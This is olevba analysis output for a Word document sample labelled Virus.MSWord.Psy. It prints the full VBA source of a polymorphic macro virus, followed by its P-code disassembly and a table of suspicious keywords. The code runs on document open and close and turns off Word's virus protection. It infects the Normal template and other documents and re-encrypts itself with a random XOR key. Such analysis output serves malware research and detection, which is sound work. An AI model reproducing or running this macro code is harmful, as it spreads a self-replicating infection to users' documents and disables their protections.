olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Psy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Psy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Psy - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen(): psycode: End Sub
Private Sub document_open(): psycode: End Sub
Private Sub autoclose(): psycode: End Sub
Private Sub document_close(): psycode: End Sub
Private Sub psycode()
Application.ShowVisualBasicEditor = 0
If Len(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(1, 5)) <> Len(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.lines(1, 5)) Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: psycodeX
End Sub
Private Sub psycodeX()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
newcode
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString (.lines(.ProcStartLine("autoexec", 0), .CountOfLines - .ProcStartLine("autoexec", 0) + 1))
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString (.lines(1, 4))
End With
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.replaceline .ProcStartLine("autoexec", 0), "private sub psycode"
For x = .CountOfLines - 8 To .CountOfLines
crap = ""
For y = 0 To 20 + Int(Rnd * 20)
crap = crap & Chr$(32 + Int(Rnd * 224))
Next y
.replaceline x, .lines(x, 1) & "'" & crap
Next x
End With
With ActiveDocument
.SaveAs .FullName
End With
End Sub
Private Sub newcode()
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
c = (128 + Int(Rnd * 128))
.replaceline .ProcStartLine("autoexec", 0) + 1, "c=" & c
.replaceline .ProcStartLine("autoexec", 0) + 2, "a1=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 3, "a2=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 4, "a3=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 5, "a4=" & Chr$(34) & Chr$(34)
s = UCase$(.lines(1, (.CountOfLines)))
For k = 1 To Len(s)
t = Mid$(s, k, 1)
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr$(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next k
For x = 1 To Len(p): b = b & Chr$(Asc(Mid$(p, x, 1)) Xor c): Next x
.replaceline .ProcStartLine("autoexec", 0) + 2, "a1=" & Chr$(34) & Mid$(b, 1, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 3, "a2=" & Chr$(34) & Mid$(b, 1017, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 4, "a3=" & Chr$(34) & Mid$(b, 2033, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 5, "a4=" & Chr$(34) & Mid$(b, 3049) & Chr$(34)
End With
End Sub
Private Sub autoquit()
newcode
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .ProcStartLine("autoexec", 0) - 1
End With
NormalTemplate.Save
End Sub
Private Sub toolsoptions()
Options.VirusProtection = 1
Dialogs(974).Show
Options.VirusProtection = 1
End Sub
Private Sub viewvbcode()
If Day(Now()) <> 28 Or Month(Now()) <> 51 Then GoTo bye
a = "psycode v?.?? may 28 1999"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee", "Text") = a
With Assistant
    .Visible = 1
    .Animation = 25
With Assistant.NewBalloon
    .Heading = a
    .Show
End With
    .Visible = 0
End With
bye: End Sub
Private Sub autoexec()
c = 0
a1 = ""
a2 = ""
a3 = ""
a4 = ""
a = a1 & a2 & a3 & a4
For x = 1 To Len(a)
    b = b & Chr$(Asc(Mid$(a, x, 1)) Xor c)
Next x
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString b
End With
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Psy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2119 bytes
' Macros/VBA/ThisDocument1 - 6745 bytes
' Line #0:
' 	FuncDefn (Private Sub autoopen())
' 	BoS 0x0000 
' 	ArgsCall psycode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' 	FuncDefn (Private Sub document_open())
' 	BoS 0x0000 
' 	ArgsCall psycode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub autoclose())
' 	BoS 0x0000 
' 	ArgsCall psycode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub document_close())
' 	BoS 0x0000 
' 	ArgsCall psycode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub psycode())
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #6:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	ArgsCall psycodeX 0x0000 
' 	EndIf 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub psycodeX())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St EnableCancelKey 
' Line #11:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #12:
' 	ArgsCall newcode 0x0000 
' Line #13:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	MemLdWith CountOfLines 
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsMemLdWith lines 0x0002 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsMemLdWith lines 0x0002 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #15:
' 	EndWith 
' Line #16:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #17:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitStr 0x0013 "private sub psycode"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0008 
' 	Sub 
' 	MemLdWith CountOfLines 
' 	For 
' Line #19:
' 	LitStr 0x0000 ""
' 	St crap 
' Line #20:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Add 
' 	For 
' Line #21:
' 	Ld crap 
' 	LitDI2 0x0020 
' 	Ld Rnd 
' 	LitDI2 0x00E0 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	St crap 
' Line #22:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld x 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld crap 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndWith 
' Line #26:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #27:
' 	MemLdWith FullName 
' 	ArgsMemCallWith SaveAs 0x0001 
' Line #28:
' 	EndWith 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Private Sub newcode())
' Line #31:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #32:
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	LitDI2 0x0080 
' 	Mul 
' 	FnInt 
' 	Add 
' 	Paren 
' 	St c 
' Line #33:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0002 "c="
' 	Ld c 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #34:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0003 "a1="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #35:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0003 "a2="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #36:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0003 "a3="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #37:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x0003 "a4="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #38:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	Paren 
' 	ArgsMemLdWith lines 0x0002 
' 	ArgsLd UCase$ 0x0001 
' 	St s 
' Line #39:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #40:
' 	Ld s 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St t 
' Line #41:
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St t 
' 	EndIf 
' Line #42:
' 	Ld p 
' 	Ld t 
' 	Concat 
' 	St p 
' Line #43:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld p 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld B 
' 	Ld p 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	Xor 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	St B 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0003 "a1="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x03F8 
' 	ArgsLd Mid$$ 0x0003 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #46:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0003 "a2="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x03F9 
' 	LitDI2 0x03F8 
' 	ArgsLd Mid$$ 0x0003 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0003 "a3="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x07F1 
' 	LitDI2 0x03F8 
' 	ArgsLd Mid$$ 0x0003 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #48:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x0003 "a4="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x0BE9 
' 	ArgsLd Mid$$ 0x0002 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	EndWith 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Private Sub autoquit())
' Line #52:
' 	ArgsCall newcode 0x0000 
' Line #53:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #54:
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #55:
' 	EndWith 
' Line #56:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub toolsoptions())
' Line #59:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Sub viewvbcode())
' Line #64:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Ne 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0033 
' 	Ne 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo bye 
' 	EndIf 
' Line #65:
' 	LitStr 0x0019 "psycode v?.?? may 28 1999"
' 	St a 
' Line #66:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	LitStr 0x0034 "HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee"
' 	LitStr 0x0004 "Text"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #67:
' 	StartWithExpr 
' 	Ld Assistant 
' 	With 
' Line #68:
' 	LitDI2 0x0001 
' 	MemStWith Visible 
' Line #69:
' 	LitDI2 0x0019 
' 	MemStWith Animation 
' Line #70:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #71:
' 	Ld a 
' 	MemStWith Heading 
' Line #72:
' 	ArgsMemCallWith Show 0x0000 
' Line #73:
' 	EndWith 
' Line #74:
' 	LitDI2 0x0000 
' 	MemStWith Visible 
' Line #75:
' 	EndWith 
' Line #76:
' 	Label bye 
' 	EndSub 
' Line #77:
' 	FuncDefn (Private Sub autoexec())
' Line #78:
' 	LitDI2 0x0000 
' 	St c 
' Line #79:
' 	LitStr 0x0000 ""
' 	St a1 
' Line #80:
' 	LitStr 0x0000 ""
' 	St a2 
' Line #81:
' 	LitStr 0x0000 ""
' 	St a3 
' Line #82:
' 	LitStr 0x0000 ""
' 	St a4 
' Line #83:
' 	Ld a1 
' 	Ld a2 
' 	Concat 
' 	Ld a3 
' 	Concat 
' 	Ld a4 
' 	Concat 
' 	St a 
' Line #84:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' Line #85:
' 	Ld B 
' 	Ld a 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	Xor 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	St B 
' Line #86:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #88:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #89:
' 	Ld B 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #90:
' 	EndWith 
' Line #91:
' 	EndSub 
' Line #92:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

